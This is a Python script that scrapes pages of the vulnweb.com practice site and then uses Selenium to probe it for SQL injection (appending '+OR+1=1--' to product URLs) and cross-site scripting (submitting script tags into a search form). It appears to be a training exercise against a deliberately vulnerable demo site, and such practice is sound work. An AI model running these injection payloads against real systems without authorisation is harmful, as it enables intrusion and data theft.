from bs4 import BeautifulSoup
from selenium import webdriver
from time import sleep,time
import requests

start = time()

#scraping
print("Scraping data..")
url1 = "http://testphp.vulnweb.com/"
source = requests.get(url1).text
soup =  BeautifulSoup(source, 'lxml')
print("All href links:-")
links = soup.find_all('a')
for link in links:
	if(link['href'][0:4] == "http"):
		print(link['href'])
	else:
		print(url1 + link['href'] )
print()

source = requests.get("http://testphp.vulnweb.com/artists.php").text
soup =  BeautifulSoup(source, 'lxml')
print("Artists:-")
artists = soup.find_all(class_="story")
for artist in artists:
	print(artist.a.h3.text)
print()

source = requests.get("http://testphp.vulnweb.com/categories.php").text
soup =  BeautifulSoup(source, 'lxml')
print("Categories:-")
headlines = soup.find_all(class_="story")
for headline in headlines:
	print(headline.a.h3.text)
print()

#sqli
url2 = "http://testphp.vulnweb.com/listproducts.php?cat=1"
url3 = "http://testphp.vulnweb.com/listproducts.php?artist=2"
payload = "+OR+1=1--"

driver = webdriver.Chrome('/Applications/chromedriver')
driver.maximize_window()
print("Browser opened.")
print("Testing for SQLi..")

driver.get(url2)
sleep(1)
driver.get(driver.current_url + payload)
sleep(4)

driver.get(url3)
sleep(1)
driver.get(driver.current_url + payload)
sleep(4)

#xss
print("Testing for xss..")

url4 = "http://testphp.vulnweb.com/search.php?test=query"
inputbox = '//*[@id="search"]/form/input[1]'
button = '//*[@id="search"]/form/input[2]'
script1 = "<script>document.title = 'Title changed using Selenium.';</script>"
script2 = "<script>alert('Vulnerable to xss.');</script>"
script3 = "<script>document.bgColor = 'lightblue'</script>"

driver.get(url4)
print("Initial title: " + driver.title)
driver.find_element_by_xpath(inputbox).send_keys(script1)
sleep(1)
driver.find_element_by_xpath(button).click()
print("Final title: " + driver.title)
print()
sleep(2)

driver.find_element_by_xpath(inputbox).send_keys(script3)
sleep(1)
driver.find_element_by_xpath(button).click()
sleep(1)

driver.find_element_by_xpath(inputbox).send_keys(script2)
sleep(1)
driver.find_element_by_xpath(button).click()
sleep(2)

driver.quit()

end = time()
print("Completed in " + str(round(end-start,2)) + " seconds.")
